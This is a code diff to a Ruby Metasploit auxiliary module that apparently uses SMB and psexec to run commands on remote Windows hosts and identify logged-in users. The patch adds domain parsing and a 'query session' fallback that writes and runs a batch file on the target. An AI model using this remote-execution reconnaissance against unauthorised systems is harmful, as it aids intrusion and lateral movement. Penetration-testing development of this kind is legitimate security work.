@@ -127,7 +127,7 @@ class Metasploit3 < Msf::Auxiliary
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 			if output = get_output(ip, smbshare, text)
-				domain, username = "",""
+				domain, username, dnsdomain = "","",""
 				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
 				if datastore['USERNAME'].length > 0
 					output.each_line do |line|
@@ -142,12 +142,16 @@ class Metasploit3 < Msf::Auxiliary
 				output.each_line do |line|
 					domain = line if line.include?("USERDOMAIN")
 					username = line if line.include?("USERNAME")
+					dnsdomain = line if line.include?("USERDNSDOMAIN")
 				end
 				if username.length > 0 && domain.length > 0
-					print_good("#{ip} -  #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+					print_good("#{ip} - #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
 				else
-					print_status("#{ip} - Unable to determine user information for user: #{key}")
-					#print_status("#{ip} - Dumping raw output.\r\n#{output}")
+					if username = query_session(smbshare, ip, cmd, text, bat)
+						print_good("#{ip} - #{dnsdomain.split(" ")[2].split(".")[0].to_s}\\#{username}")
+					else
+						print_status("#{ip} - Unable to determine user information for user: #{key}")
+					end
 				end
 			else
 				print_status("#{ip} - Could not determine logged in users")
@@ -171,6 +175,26 @@ class Metasploit3 < Msf::Auxiliary
 		rescue StandardError => cleanuperror
 			print_error("Unable to processes cleanup commands: #{cleanuperror}")
 			return cleanuperror
+		end
+	end
+
+
+
+	# Method trys to use "query session" to determine logged in user
+	def query_session(smbshare, ip, cmd, text, bat)
+		begin
+			command = "#{cmd} /C echo query session ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
+			simple.connect(smbshare)
+			psexec(smbshare, command)
+			userline = ""
+			if output = get_output(ip, smbshare, text)
+				output.each_line { |line| userline << line if line[0] == '>' }
+			else
+				return nil
+			end
+			return userline.split(" ")[1].chomp
+		rescue
+			return nil
 		end
 	end
 
